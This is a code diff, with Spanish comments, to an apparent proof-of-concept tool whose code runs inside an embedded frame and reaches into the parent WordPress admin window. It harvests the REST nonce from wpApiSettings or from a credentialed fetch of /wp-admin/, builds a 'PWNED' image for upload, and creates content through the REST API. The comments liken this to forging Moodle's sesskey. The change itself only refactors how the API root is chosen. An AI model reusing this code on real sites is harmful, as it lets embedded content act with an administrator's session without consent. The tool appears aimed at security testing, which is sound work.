@@ -14,11 +14,11 @@ export function wpNonce(win) {
   return null;
 }
 
-// Raíz de la REST API: wpApiSettings.root (con barra final) si está a mano,
-// si no /wp-json/ colgando del origen del padre. A diferencia del sesskey de
-// Moodle no hace falta forjar nada: el nonce ya viaja en el DOM de wp-admin.
-function wpApiRoot(w, ctx) {
-  try { if (w.wpApiSettings && w.wpApiSettings.root) return w.wpApiSettings.root; } catch (e) { /* ignorado */ }
+// Raíz de la REST API. Legacy (probe.js:501,548,581) codifica /wp-json/ sin
+// consultar la configuración: con enlaces permanentes simples
+// wpApiSettings.root sería <origen>/?rest_route=/ y el destino cambiaría. Se
+// mantiene el literal para que escritura y undo apunten siempre al mismo sitio.
+function wpApiRoot(ctx) {
   return ctx.win.location.origin + '/wp-json/';
 }
 
@@ -77,7 +77,7 @@ export function photo(ctx, journal, cb) {
   try {
     var w = ctx.parentWin();
     if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
-    var root = wpApiRoot(w, ctx);
+    var root = wpApiRoot(ctx);
     var c = ctx.win.document.createElement('canvas'); c.width = 96; c.height = 96;
     var g = c.getContext('2d'); g.fillStyle = '#39ff77'; g.fillRect(0, 0, 96, 96);
     g.fillStyle = '#b00020'; g.font = 'bold 20px sans-serif'; g.fillText('PWNED', 8, 56);
@@ -124,7 +124,7 @@ export function createContent(ctx, journal, cb) {
   try {
     var w = ctx.parentWin();
     if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
-    var root = wpApiRoot(w, ctx);
+    var root = wpApiRoot(ctx);
     var getNonce = function () {
       try { if (w.wpApiSettings && w.wpApiSettings.nonce) { return Promise.resolve(w.wpApiSettings.nonce); } } catch (e) { /* ignorado */ }
       return w.fetch(ctx.win.location.origin + '/wp-admin/', { credentials: 'same-origin' })
